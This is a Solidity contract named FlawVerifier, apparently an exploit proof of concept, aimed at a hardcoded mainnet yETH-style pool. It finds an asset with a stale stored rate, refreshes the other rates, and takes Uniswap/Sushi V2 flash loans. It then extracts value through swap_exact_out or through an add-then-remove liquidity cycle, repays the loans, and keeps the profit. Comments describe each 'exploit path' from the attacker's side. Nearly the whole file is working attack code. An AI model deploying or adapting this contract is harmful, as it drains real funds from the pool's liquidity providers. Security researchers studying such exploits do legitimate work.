// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IRateProvider {
    function rate(address asset) external view returns (uint256);
}

interface IYETHPool {
    function num_assets() external view returns (uint256);
    function token() external view returns (address);
    function assets(uint256 index) external view returns (address);
    function rate_providers(uint256 index) external view returns (address);
    function rate(uint256 index) external view returns (uint256);
    function update_rates(uint256[] calldata assetsToUpdate) external;
    function swap(
        uint256 assetIn,
        uint256 assetOut,
        uint256 amountIn,
        uint256 minAmountOut,
        address receiver
    ) external returns (uint256);
    function swap_exact_out(
        uint256 assetIn,
        uint256 assetOut,
        uint256 amountOut,
        uint256 maxAmountIn,
        address receiver
    ) external returns (uint256);
    function add_liquidity(
        uint256[] calldata amounts,
        uint256 minLpAmount,
        address receiver
    ) external returns (uint256);
    function remove_liquidity_single(
        uint256 asset,
        uint256 lpAmount,
        uint256 minAmount,
        address receiver
    ) external returns (uint256);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    uint256 private constant BPS = 10_000;
    uint256 private constant SEARCH_MIN_PROFIT = 1e15;

    uint256 private constant MODE_NONE = 0;
    uint256 private constant MODE_SWAP_EXACT_OUT = 1;
    uint256 private constant MODE_LP = 2;

    address public constant TARGET_POOL = 0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _busy;

    uint256 private _mode;
    address private _flashPair;
    address private _flashToken;
    uint256 private _flashBorrowAmount;
    uint256 private _flashRepayAmount;
    uint256 private _flashAssetA;
    uint256 private _flashAssetB;
    uint256 private _flashStaleAsset;
    uint256 private _flashTargetAmountOut;
    address private _exitPair0;
    address private _exitPair1;
    address private _exitMidToken;

    address private _pendingFlashPair;
    address private _pendingExitPair0;
    address private _pendingExitPair1;
    address private _pendingExitMidToken;
    uint256 private _pendingAssetA;
    uint256 private _pendingAssetB;
    uint256 private _pendingStaleAsset;
    uint256 private _pendingBorrowAmount;
    uint256 private _pendingAmountOut;

    constructor() {}

    function executeOnOpportunity() external {
        require(!_busy, "busy");
        _busy = true;
        _profitToken = address(0);
        _profitAmount = 0;

        IYETHPool pool = IYETHPool(TARGET_POOL);
        uint256 numAssets = pool.num_assets();

        uint256 bestStale = type(uint256).max;
        uint256 bestDrop = 0;

        for (uint256 i = 0; i < numAssets; ++i) {
            (uint256 storedRate, uint256 liveRate) = _readRates(pool, i);
            if (storedRate == 0 || liveRate == 0 || liveRate >= storedRate) {
                continue;
            }

            uint256 drop = storedRate - liveRate;
            if (drop > bestDrop) {
                bestDrop = drop;
                bestStale = i;
            }
        }

        if (bestStale != type(uint256).max) {
            _syncAllBut(pool, numAssets, bestStale);
            if (!_searchFlashSwapExactOut(pool, numAssets, bestStale)) {
                _searchFlashMintThenWithdraw(pool, numAssets, bestStale);
            }
        }

        _busy = false;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function attemptFlashSwapExactOut() external {
        require(msg.sender == address(this), "self only");

        IYETHPool pool = IYETHPool(TARGET_POOL);
        address tokenA = pool.assets(_pendingAssetA);
        address tokenB = pool.assets(_pendingAssetB);

        uint256 beforeA = IERC20(tokenA).balanceOf(address(this));
        uint256 beforeB = IERC20(tokenB).balanceOf(address(this));

        _mode = MODE_SWAP_EXACT_OUT;
        _flashPair = _pendingFlashPair;
        _flashToken = tokenA;
        _flashBorrowAmount = _pendingBorrowAmount;
        _flashRepayAmount = _quoteFlashRepay(_pendingBorrowAmount);
        _flashAssetA = _pendingAssetA;
        _flashAssetB = _pendingAssetB;
        _flashStaleAsset = _pendingStaleAsset;
        _flashTargetAmountOut = _pendingAmountOut;
        _exitPair0 = _pendingExitPair0;
        _exitPair1 = _pendingExitPair1;
        _exitMidToken = _pendingExitMidToken;

        _borrowFromPair(_flashPair, tokenA, _pendingBorrowAmount);
        _finalizePairProfit(tokenA, tokenB, beforeA, beforeB, SEARCH_MIN_PROFIT);
        _clearAttemptState();
    }

    function attemptFlashLp() external {
        require(msg.sender == address(this), "self only");

        IYETHPool pool = IYETHPool(TARGET_POOL);
        address tokenA = pool.assets(_pendingAssetA);
        address tokenB = pool.assets(_pendingAssetB);

        uint256 beforeA = IERC20(tokenA).balanceOf(address(this));
        uint256 beforeB = IERC20(tokenB).balanceOf(address(this));

        _mode = MODE_LP;
        _flashPair = _pendingFlashPair;
        _flashToken = tokenA;
        _flashBorrowAmount = _pendingBorrowAmount;
        _flashRepayAmount = _quoteFlashRepay(_pendingBorrowAmount);
        _flashAssetA = _pendingAssetA;
        _flashAssetB = _pendingAssetB;
        _flashStaleAsset = _pendingStaleAsset;
        _flashTargetAmountOut = 0;
        _exitPair0 = _pendingExitPair0;
        _exitPair1 = _pendingExitPair1;
        _exitMidToken = _pendingExitMidToken;

        _borrowFromPair(_flashPair, tokenA, _pendingBorrowAmount);
        _finalizePairProfit(tokenA, tokenB, beforeA, beforeB, SEARCH_MIN_PROFIT);
        _clearAttemptState();
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(sender == address(this), "bad sender");
        require(msg.sender == _flashPair, "bad pair");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed == _flashBorrowAmount, "bad amount");

        if (_mode == MODE_SWAP_EXACT_OUT) {
            _executeFlashSwapExactOutThenRepay();
        } else if (_mode == MODE_LP) {
            _executeFlashMintThenWithdraw();
        } else {
            revert("bad mode");
        }

        _safeTransfer(_flashToken, _flashPair, _flashRepayAmount);
    }

    function _searchFlashSwapExactOut(
        IYETHPool pool,
        uint256 numAssets,
        uint256 staleAsset
    ) internal returns (bool) {
        for (uint256 assetA = 0; assetA < numAssets; ++assetA) {
            if (assetA == staleAsset || !_isHealthy(pool, assetA)) {
                continue;
            }

            address tokenA = pool.assets(assetA);
            address[8] memory fundingPairs = _candidatePairs(tokenA);

            for (uint256 assetB = 0; assetB < numAssets; ++assetB) {
                if (assetB == staleAsset || assetB == assetA || !_isHealthy(pool, assetB)) {
                    continue;
                }

                address tokenB = pool.assets(assetB);
                uint256 poolBalanceB = IERC20(tokenB).balanceOf(TARGET_POOL);
                if (poolBalanceB <= SEARCH_MIN_PROFIT) {
                    continue;
                }

                for (uint256 p = 0; p < fundingPairs.length; ++p) {
                    address flashPair = fundingPairs[p];
                    if (flashPair == address(0)) {
                        continue;
                    }
                    if (_attemptFlashSwapCandidate(pool, staleAsset, assetA, assetB, flashPair, poolBalanceB)) {
                        return true;
                    }
                }
            }
        }

        return false;
    }

    function _searchFlashMintThenWithdraw(
        IYETHPool pool,
        uint256 numAssets,
        uint256 staleAsset
    ) internal returns (bool) {
        for (uint256 assetA = 0; assetA < numAssets; ++assetA) {
            if (assetA == staleAsset || !_isHealthy(pool, assetA)) {
                continue;
            }

            address tokenA = pool.assets(assetA);
            address[8] memory fundingPairs = _candidatePairs(tokenA);

            for (uint256 assetB = 0; assetB < numAssets; ++assetB) {
                if (assetB == staleAsset || assetB == assetA || !_isHealthy(pool, assetB)) {
                    continue;
                }

                address tokenB = pool.assets(assetB);
                uint256 poolBalanceB = IERC20(tokenB).balanceOf(TARGET_POOL);
                if (poolBalanceB <= SEARCH_MIN_PROFIT) {
                    continue;
                }

                for (uint256 p = 0; p < fundingPairs.length; ++p) {
                    address flashPair = fundingPairs[p];
                    if (flashPair == address(0)) {
                        continue;
                    }
                    if (_attemptFlashLpCandidate(pool, staleAsset, assetA, assetB, flashPair, poolBalanceB)) {
                        return true;
                    }
                }
            }
        }

        return false;
    }

    function _attemptFlashSwapCandidate(
        IYETHPool pool,
        uint256 staleAsset,
        uint256 assetA,
        uint256 assetB,
        address flashPair,
        uint256 poolBalanceB
    ) internal returns (bool) {
        address tokenA = pool.assets(assetA);
        address tokenB = pool.assets(assetB);
        (address exitPair0, address exitPair1, address exitMidToken) = _findExitRoute(tokenB, tokenA, flashPair);
        if (exitPair0 == address(0)) {
            return false;
        }

        uint256 flashLiquidity = _pairTokenLiquidity(flashPair, tokenA);
        if (flashLiquidity <= SEARCH_MIN_PROFIT) {
            return false;
        }

        uint256 maxBorrow = _min(flashLiquidity / 5, poolBalanceB / 3);
        if (maxBorrow <= SEARCH_MIN_PROFIT) {
            return false;
        }

        _pendingFlashPair = flashPair;
        _pendingExitPair0 = exitPair0;
        _pendingExitPair1 = exitPair1;
        _pendingExitMidToken = exitMidToken;
        _pendingAssetA = assetA;
        _pendingAssetB = assetB;
        _pendingStaleAsset = staleAsset;

        return _tryFlashSwapExactOutSizes(maxBorrow, poolBalanceB);
    }

    function _attemptFlashLpCandidate(
        IYETHPool pool,
        uint256 staleAsset,
        uint256 assetA,
        uint256 assetB,
        address flashPair,
        uint256 poolBalanceB
    ) internal returns (bool) {
        address tokenA = pool.assets(assetA);
        address tokenB = pool.assets(assetB);
        (address exitPair0, address exitPair1, address exitMidToken) = _findExitRoute(tokenB, tokenA, flashPair);
        if (exitPair0 == address(0)) {
            return false;
        }

        uint256 flashLiquidity = _pairTokenLiquidity(flashPair, tokenA);
        if (flashLiquidity <= SEARCH_MIN_PROFIT) {
            return false;
        }

        uint256 maxBorrow = _min(flashLiquidity / 6, poolBalanceB / 4);
        if (maxBorrow <= SEARCH_MIN_PROFIT) {
            return false;
        }

        _pendingFlashPair = flashPair;
        _pendingExitPair0 = exitPair0;
        _pendingExitPair1 = exitPair1;
        _pendingExitMidToken = exitMidToken;
        _pendingAssetA = assetA;
        _pendingAssetB = assetB;
        _pendingStaleAsset = staleAsset;

        return _tryFlashLpSizes(maxBorrow);
    }

    function _tryFlashSwapExactOutSizes(uint256 maxBorrow, uint256 poolBalanceB) internal returns (bool) {
        uint256[12] memory borrowDivisors =
            [uint256(8), 12, 16, 20, 24, 32, 40, 50, 64, 80, 100, 125];
        uint256[12] memory outDivisors =
            [uint256(12), 16, 20, 24, 32, 40, 50, 64, 80, 100, 125, 160];

        for (uint256 i = 0; i < borrowDivisors.length; ++i) {
            uint256 borrowAmount = maxBorrow / borrowDivisors[i];
            if (borrowAmount <= SEARCH_MIN_PROFIT) {
                continue;
            }

            for (uint256 j = 0; j < outDivisors.length; ++j) {
                uint256 amountOut = poolBalanceB / outDivisors[j];
                if (amountOut <= SEARCH_MIN_PROFIT) {
                    continue;
                }

                _pendingBorrowAmount = borrowAmount;
                _pendingAmountOut = amountOut;

                try this.attemptFlashSwapExactOut() {
                    return true;
                } catch {}
            }
        }

        return false;
    }

    function _tryFlashLpSizes(uint256 maxBorrow) internal returns (bool) {
        uint256[12] memory divisors =
            [uint256(12), 16, 20, 24, 32, 40, 50, 64, 80, 100, 125, 160];

        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 borrowAmount = maxBorrow / divisors[i];
            if (borrowAmount <= SEARCH_MIN_PROFIT) {
                continue;
            }

            _pendingBorrowAmount = borrowAmount;
            _pendingAmountOut = 0;

            try this.attemptFlashLp() {
                return true;
            } catch {}
        }

        return false;
    }

    function _executeFlashSwapExactOutThenRepay() internal {
        require(_flashAssetA != _flashStaleAsset, "stale in");
        require(_flashAssetB != _flashStaleAsset, "stale out");
        require(_flashAssetA != _flashAssetB, "same asset");
        require(_flashTargetAmountOut > 0, "no out");

        IYETHPool pool = IYETHPool(TARGET_POOL);
        address tokenA = pool.assets(_flashAssetA);
        address tokenB = pool.assets(_flashAssetB);

        // Exploit path 0:
        // Asset C has already moved down on-chain, but we leave C untouched and only interact with
        // healthy A and healthy B. The stale C rate therefore stays embedded in pool accounting.
        //
        // Exploit path 1:
        // The attacker swaps between healthy A and healthy B.
        //
        // Exploit path 2:
        // `swap_exact_out()` refreshes only A and B. Because stale asset C is not refreshed, the
        // pool still values C at its old rate when solving the invariant for this swap.
        //
        // Exploit path 3:
        // The pool accepts too little healthy A for the requested healthy B output. A flashswap only
        // funds the realistic upfront capital; selling part of B back into A is just the repayment
        // leg and does not alter the stale-rate causality.
        _forceApprove(tokenA, TARGET_POOL, _flashBorrowAmount);
        pool.swap_exact_out(_flashAssetA, _flashAssetB, _flashTargetAmountOut, _flashBorrowAmount, address(this));

        _rebalanceForRepayment(tokenA, tokenB, _flashRepayAmount);
        require(IERC20(tokenA).balanceOf(address(this)) >= _flashRepayAmount, "repay shortfall");
    }

    function _executeFlashMintThenWithdraw() internal {
        require(_flashAssetA != _flashStaleAsset, "stale deposit");
        require(_flashAssetB != _flashStaleAsset, "stale withdraw");
        require(_flashAssetA != _flashAssetB, "same asset");

        IYETHPool pool = IYETHPool(TARGET_POOL);
        address tokenA = pool.assets(_flashAssetA);
        address tokenB = pool.assets(_flashAssetB);
        address lpToken = pool.token();

        uint256[] memory amounts = new uint256[](pool.num_assets());
        amounts[_flashAssetA] = _flashBorrowAmount;

        // Exploit path 1:
        // Deposit only healthy asset A, then withdraw only healthy asset B.
        //
        // Exploit path 2:
        // `add_liquidity()` refreshes only the deposited asset and `remove_liquidity_single()`
        // refreshes only the withdrawn asset. Stale asset C is untouched, so `vb_sum`, `vb_prod`,
        // and effective supply accounting still overvalue C while LP is minted and redeemed.
        //
        // Exploit path 3:
        // The pool over-mints LP against the stale invariant and then over-withdraws healthy B. The
        // external V2 swap is only the capital repayment leg for the flashswap.
        _forceApprove(tokenA, TARGET_POOL, _flashBorrowAmount);
        uint256 lpBefore = IERC20(lpToken).balanceOf(address(this));
        pool.add_liquidity(amounts, 0, address(this));
        uint256 minted = IERC20(lpToken).balanceOf(address(this)) - lpBefore;
        require(minted > 0, "no lp");

        pool.remove_liquidity_single(_flashAssetB, minted, 0, address(this));

        _rebalanceForRepayment(tokenA, tokenB, _flashRepayAmount);
        require(IERC20(tokenA).balanceOf(address(this)) >= _flashRepayAmount, "repay shortfall");
    }

    function _finalizePairProfit(
        address tokenA,
        address tokenB,
        uint256 beforeA,
        uint256 beforeB,
        uint256 minProfit
    ) internal {
        uint256 afterB = IERC20(tokenB).balanceOf(address(this));
        if (afterB > beforeB) {
            uint256 profitB = afterB - beforeB;
            require(profitB >= minProfit, "profit below threshold");
            _profitToken = tokenB;
            _profitAmount = profitB;
            return;
        }

        uint256 afterA = IERC20(tokenA).balanceOf(address(this));
        if (afterA > beforeA) {
            uint256 profitA = afterA - beforeA;
            require(profitA >= minProfit, "profit below threshold");
            _profitToken = tokenA;
            _profitAmount = profitA;
            return;
        }

        revert("no profit");
    }

    function _rebalanceForRepayment(address tokenA, address tokenB, uint256 repayTarget) internal {
        uint256 balanceA = IERC20(tokenA).balanceOf(address(this));
        if (balanceA >= repayTarget) {
            return;
        }

        uint256 shortfall = repayTarget - balanceA;
        if (_buyExactOutputViaExitRoute(tokenB, tokenA, shortfall)) {
            return;
        }

        uint256[12] memory numerators = [uint256(1), 1, 1, 1, 1, 2, 3, 4, 1, 1, 1, 1];
        uint256[12] memory denominators = [uint256(64), 32, 16, 8, 4, 5, 7, 9, 3, 2, 1, 1];

        for (uint256 i = 0; i < numerators.length; ++i) {
            if (IERC20(tokenA).balanceOf(address(this)) >= repayTarget) {
                return;
            }

            uint256 available = IERC20(tokenB).balanceOf(address(this));
            if (available == 0) {
                return;
            }

            uint256 sellAmount = (available * numerators[i]) / denominators[i];
            if (sellAmount == 0) {
                continue;
            }

            _sellViaExitRoute(tokenB, sellAmount);
        }
    }

    function _sellViaExitRoute(address tokenFrom, uint256 amountIn) internal returns (uint256 amountOut) {
        amountOut = _swapV2ExactIn(_exitPair0, tokenFrom, amountIn, address(this));
        if (_exitPair1 != address(0)) {
            amountOut = _swapV2ExactIn(_exitPair1, _exitMidToken, amountOut, address(this));
        }
    }

    function _buyExactOutputViaExitRoute(
        address tokenFrom,
        address tokenTo,
        uint256 targetOut
    ) internal returns (bool) {
        if (targetOut == 0 || _exitPair0 == address(0)) {
            return false;
        }

        uint256 available = IERC20(tokenFrom).balanceOf(address(this));
        if (available == 0) {
            return false;
        }

        if (_exitPair1 == address(0)) {
            uint256 amountInSingle = _quoteExactOutInput(_exitPair0, tokenFrom, targetOut);
            if (amountInSingle == 0 || amountInSingle > available) {
                return false;
            }
            _swapV2ExactOut(_exitPair0, tokenFrom, tokenTo, targetOut, address(this));
            return true;
        }

        uint256 midAmount = _quoteExactOutInput(_exitPair1, _exitMidToken, targetOut);
        if (midAmount == 0) {
            return false;
        }

        uint256 amountIn = _quoteExactOutInput(_exitPair0, tokenFrom, midAmount);
        if (amountIn == 0 || amountIn > available) {
            return false;
        }

        _swapV2ExactOut(_exitPair0, tokenFrom, _exitMidToken, midAmount, address(this));
        _swapV2ExactOut(_exitPair1, _exitMidToken, tokenTo, targetOut, address(this));
        return true;
    }

    function _swapV2ExactIn(
        address pairAddress,
        address tokenIn,
        uint256 amountIn,
        address receiver
    ) internal returns (uint256 amountOut) {
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);
        address token0 = pair.token0();
        address token1 = pair.token1();
        require(tokenIn == token0 || tokenIn == token1, "bad route");

        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        bool zeroForOne = tokenIn == token0;
        uint256 reserveIn = zeroForOne ? uint256(reserve0) : uint256(reserve1);
        uint256 reserveOut = zeroForOne ? uint256(reserve1) : uint256(reserve0);

        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        _safeTransfer(tokenIn, pairAddress, amountIn);

        if (zeroForOne) {
            pair.swap(0, amountOut, receiver, new bytes(0));
        } else {
            pair.swap(amountOut, 0, receiver, new bytes(0));
        }
    }

    function _swapV2ExactOut(
        address pairAddress,
        address tokenIn,
        address tokenOut,
        uint256 amountOut,
        address receiver
    ) internal returns (uint256 amountIn) {
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);
        address token0 = pair.token0();
        address token1 = pair.token1();
        require(
            (tokenIn == token0 && tokenOut == token1) || (tokenIn == token1 && tokenOut == token0),
            "bad route"
        );

        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        bool zeroForOne = tokenIn == token0;
        uint256 reserveIn = zeroForOne ? uint256(reserve0) : uint256(reserve1);
        uint256 reserveOut = zeroForOne ? uint256(reserve1) : uint256(reserve0);
        amountIn = _getAmountIn(amountOut, reserveIn, reserveOut);

        _safeTransfer(tokenIn, pairAddress, amountIn);

        if (zeroForOne) {
            pair.swap(0, amountOut, receiver, new bytes(0));
        } else {
            pair.swap(amountOut, 0, receiver, new bytes(0));
        }
    }

    function _findExitRoute(
        address tokenFrom,
        address tokenTo,
        address excludedPair
    ) internal view returns (address pair0, address pair1, address midToken) {
        pair0 = _findPairExcluding(tokenFrom, tokenTo, excludedPair, address(0));
        if (pair0 != address(0)) {
            return (pair0, address(0), address(0));
        }

        address[4] memory hubs = [WETH, USDC, USDT, DAI];
        for (uint256 i = 0; i < hubs.length; ++i) {
            address hub = hubs[i];
            if (hub == tokenFrom || hub == tokenTo) {
                continue;
            }

            pair0 = _findPairExcluding(tokenFrom, hub, excludedPair, address(0));
            if (pair0 == address(0)) {
                continue;
            }

            pair1 = _findPairExcluding(hub, tokenTo, excludedPair, pair0);
            if (pair1 != address(0)) {
                return (pair0, pair1, hub);
            }
        }
    }

    function _candidatePairs(address token) internal view returns (address[8] memory pairs) {
        pairs[0] = _pairOrZero(UNISWAP_V2_FACTORY, token, WETH);
        pairs[1] = _pairOrZero(SUSHI_FACTORY, token, WETH);
        pairs[2] = _pairOrZero(UNISWAP_V2_FACTORY, token, USDC);
        pairs[3] = _pairOrZero(SUSHI_FACTORY, token, USDC);
        pairs[4] = _pairOrZero(UNISWAP_V2_FACTORY, token, USDT);
        pairs[5] = _pairOrZero(SUSHI_FACTORY, token, USDT);
        pairs[6] = _pairOrZero(UNISWAP_V2_FACTORY, token, DAI);
        pairs[7] = _pairOrZero(SUSHI_FACTORY, token, DAI);
    }

    function _findPairExcluding(
        address tokenA,
        address tokenB,
        address excluded0,
        address excluded1
    ) internal view returns (address pair) {
        address uni = _pairOrZero(UNISWAP_V2_FACTORY, tokenA, tokenB);
        if (uni != address(0) && uni != excluded0 && uni != excluded1) {
            return uni;
        }

        address sushi = _pairOrZero(SUSHI_FACTORY, tokenA, tokenB);
        if (sushi != address(0) && sushi != excluded0 && sushi != excluded1) {
            return sushi;
        }

        return address(0);
    }

    function _pairOrZero(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        if (tokenA == tokenB) {
            return address(0);
        }

        try IUniswapV2Factory(factory).getPair(tokenA, tokenB) returns (address found) {
            return found;
        } catch {
            return address(0);
        }
    }

    function _pairTokenLiquidity(address pairAddress, address token) internal view returns (uint256) {
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        if (pair.token0() == token) {
            return uint256(reserve0);
        }
        if (pair.token1() == token) {
            return uint256(reserve1);
        }
        return 0;
    }

    function _borrowFromPair(address pairAddress, address token, uint256 amount) internal {
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);
        if (pair.token0() == token) {
            pair.swap(amount, 0, address(this), hex"01");
        } else {
            pair.swap(0, amount, address(this), hex"01");
        }
    }

    function _syncAllBut(IYETHPool pool, uint256 numAssets, uint256 staleAsset) internal {
        if (numAssets <= 1) {
            return;
        }

        uint256[] memory indexes = new uint256[](numAssets - 1);
        uint256 count;
        for (uint256 i = 0; i < numAssets; ++i) {
            if (i == staleAsset) {
                continue;
            }
            indexes[count] = i;
            ++count;
        }

        if (count > 0) {
            pool.update_rates(indexes);
        }
    }

    function _isHealthy(IYETHPool pool, uint256 index) internal view returns (bool) {
        (uint256 storedRate, uint256 liveRate) = _readRates(pool, index);
        if (storedRate == 0 || liveRate == 0) {
            return false;
        }
        return liveRate * BPS >= storedRate * 9_950;
    }

    function _readRates(IYETHPool pool, uint256 index) internal view returns (uint256 storedRate, uint256 liveRate) {
        try pool.rate(index) returns (uint256 r) {
            storedRate = r;
        } catch {
            return (0, 0);
        }

        address provider = pool.rate_providers(index);
        address asset = pool.assets(index);
        if (provider == address(0) || asset == address(0)) {
            return (storedRate, 0);
        }

        try IRateProvider(provider).rate(asset) returns (uint256 r) {
            liveRate = r;
        } catch {
            liveRate = 0;
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountIn > 0 && reserveIn > 0 && reserveOut > 0, "bad quote");
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0 && reserveIn > 0 && reserveOut > amountOut, "bad quote");
        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
    }

    function _quoteExactOutInput(address pairAddress, address tokenIn, uint256 amountOut) internal view returns (uint256) {
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        if (pair.token0() == tokenIn) {
            if (uint256(reserve1) <= amountOut) {
                return 0;
            }
            return _getAmountIn(amountOut, uint256(reserve0), uint256(reserve1));
        }
        if (pair.token1() == tokenIn) {
            if (uint256(reserve0) <= amountOut) {
                return 0;
            }
            return _getAmountIn(amountOut, uint256(reserve1), uint256(reserve0));
        }
        return 0;
    }

    function _quoteFlashRepay(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        require(ok0 && (data0.length == 0 || abi.decode(data0, (bool))), "approve reset failed");

        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _clearPendingState() internal {
        _pendingFlashPair = address(0);
        _pendingExitPair0 = address(0);
        _pendingExitPair1 = address(0);
        _pendingExitMidToken = address(0);
        _pendingAssetA = 0;
        _pendingAssetB = 0;
        _pendingStaleAsset = 0;
        _pendingBorrowAmount = 0;
        _pendingAmountOut = 0;
    }

    function _clearAttemptState() internal {
        _mode = MODE_NONE;
        _flashPair = address(0);
        _flashToken = address(0);
        _flashBorrowAmount = 0;
        _flashRepayAmount = 0;
        _flashAssetA = 0;
        _flashAssetB = 0;
        _flashStaleAsset = 0;
        _flashTargetAmountOut = 0;
        _exitPair0 = address(0);
        _exitPair1 = address(0);
        _exitMidToken = address(0);
        _clearPendingState();
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
